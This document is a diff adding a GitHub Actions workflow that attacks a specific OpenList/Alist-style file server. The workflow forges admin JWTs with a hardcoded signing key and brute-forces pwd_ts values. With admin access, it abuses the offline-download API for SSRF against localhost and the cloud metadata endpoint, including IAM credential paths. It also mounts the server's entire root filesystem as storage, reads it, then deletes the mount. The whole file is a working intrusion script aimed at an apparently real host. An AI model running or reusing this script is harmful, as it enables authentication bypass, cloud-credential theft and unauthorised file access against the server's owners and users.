@@ -1,0 +1,95 @@
+name: openlist-admin-jwt-forge-test
+on:
+  workflow_dispatch:
+jobs:
+  admin:
+    runs-on: ubuntu-latest
+    steps:
+      - name: forge admin/guest JWT with jwt.key and pwd_ts candidates, test acceptance, run SSRF if admin
+        run: |
+          set +e
+          B="https://pan.yazinb.icu"
+          KEY="UOe38cvM8ttWN2ag6dHhyVSJTeLKkdPl"
+          python3 - <<'PY' 2>&1 | tee /tmp/forge.out
+          import hmac, hashlib, base64, json, time, urllib.request, ssl, sys
+          KEY=b"UOe38cvM8ttWN2ag6dHhyVSJTeLKkdPl"
+          def b64(x): return base64.urlsafe_b64encode(x).rstrip(b"=")
+          def forge(username, pwd_ts, exp_h=2):
+              now=int(time.time())
+              header={"alg":"HS256","typ":"JWT"}
+              payload={"username":username,"pwd_ts":pwd_ts,
+                       "exp":now+exp_h*3600,"iat":now,"nbf":now}
+              h=b64(json.dumps(header,separators=(",",":")).encode())
+              p=b64(json.dumps(payload,separators=(",",":")).encode())
+              sig=b64(hmac.new(KEY,h+b"."+p,hashlib.sha256).digest())
+              return h.decode()+"."+p.decode()+"."+sig.decode()
+          ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+          def call(path,token,method="GET",payload=None):
+              headers={"Authorization":token}
+              data=None
+              if payload is not None:
+                  headers["Content-Type"]="application/json"; data=json.dumps(payload).encode()
+              req=urllib.request.Request(B+path,data=data,headers=headers,method=method)
+              try:
+                  r=urllib.request.urlopen(req,context=ctx,timeout=25)
+                  return r.status, r.read().decode()[:400]
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode()[:400]
+              except Exception as e:
+                  return 0, "ERR "+repr(e)
+          print("KEY_LEN",len(KEY))
+          # control: forged guest (pwd_ts=0, matches observed guest) -> isolates cache-gate vs pwd_ts-gate
+          gt=forge("guest",0)
+          c,b=call("/api/me",gt)
+          print(f"CONTROL guest/0 -> HTTP {c} {b!r}")
+          admin_ok=None
+          cands=[0,1,2,3,4,5,6,7,8,9,10]
+          for pts in cands:
+              t=forge("admin",pts)
+              c,b=call("/api/me",t)
+              print(f"ADMIN pwd_ts={pts} -> /api/me HTTP {c} {b!r}")
+              if c==200 and '"username":"admin"' in b:
+                  c2,b2=call("/api/admin/setting/list",t,method="POST",payload={})
+                  print(f"ADMIN pwd_ts={pts} -> /api/admin/setting/list HTTP {c2} {b2!r}")
+                  if c2==200:
+                      admin_ok=t
+                      print(">>> ADMIN JWT ACCEPTED pwd_ts="+str(pts))
+                      break
+          if admin_ok is None:
+              print("RESULT: NO forged admin JWT accepted by any pwd_ts candidate 0..10")
+              open("/tmp/admin_jwt.txt","w").write("")
+          else:
+              open("/tmp/admin_jwt.txt","w").write(admin_ok)
+          PY
+          AJ=$(cat /tmp/admin_jwt.txt 2>/dev/null)
+          if [ -z "$AJ" ]; then
+            echo "=== NO ADMIN JWT -> SSRF stage skipped ==="
+          else
+            echo "=== ADMIN JWT ACCEPTED, running SSRF primitives ==="
+            ssrf () {
+              name=$1; url=$2
+              echo "=== SSRF $name -> $url ==="
+              curl -skS -m30 -X POST "$B/api/fs/add_offline_download" -H "Authorization: $AJ" -H "Content-Type: application/json" -d "{\"path\":\"/$name\",\"urls\":[\"$url\"]}" -w "\n  add HTTP %{http_code}\n" | head -c 400
+              sleep 6
+              lst=$(curl -skS -m30 -X POST "$B/api/fs/list" -H "Authorization: $AJ" -H "Content-Type: application/json" -d "{\"path\":\"/$name\"}")
+              echo "  list: $(echo "$lst" | head -c 250)"
+              fn=$(echo "$lst" | python3 -c "import sys,json;d=json.load(sys.stdin);c=d.get('data',{}).get('content',[]);print(c[0]['name'] if c else '')" 2>/dev/null)
+              if [ -n "$fn" ]; then
+                ru=$(curl -skS -m30 -X POST "$B/api/fs/get" -H "Authorization: $AJ" -H "Content-Type: application/json" -d "{\"path\":\"/$name/$fn\"}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('data',{}).get('raw_url',''))" 2>/dev/null)
+                echo "  raw_url: $ru"; echo "  --- internal body (first 800B) ---"; curl -skS -m30 "$ru" | head -c 800; echo
+              else echo "  (no file landed - SSRF blocked or async)"; fi
+            }
+            ssrf ssrf_local80 "http://127.0.0.1:80/"
+            ssrf ssrf_meta "http://169.254.169.254/latest/meta-data/"
+            ssrf ssrf_meta_iam "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+            echo "--- mount / as Local storage (read whole fs) ---"
+            addresp=$(curl -skS -m30 -X POST "$B/api/admin/storage/create" -H "Authorization: $AJ" -H "Content-Type: application/json" -d '{"mount_path":"/rootshell","driver":"Local","addition":{"root_folder_path":"/","thumbnail":false,"show_hidden":true}}')
+            echo "  create resp: $(echo "$addresp" | head -c 350)"
+            sid=$(echo "$addresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('data',{}).get('id',''))" 2>/dev/null)
+            if [ -n "$sid" ]; then
+              sleep 4
+              echo "  ls /rootshell (top of fs): $(curl -skS -m30 -X POST "$B/api/fs/list" -H "Authorization: $AJ" -H "Content-Type: application/json" -d '{"path":"/rootshell"}' | head -c 500)"
+              curl -skS -m20 -X POST "$B/api/admin/storage/delete" -H "Authorization: $AJ" -H "Content-Type: application/json" -d "{\"id\":$sid}" -w "  cleanup delete -> %{http_code}\n" -o /dev/null
+            fi
+          fi
+          echo "=== DONE ==="
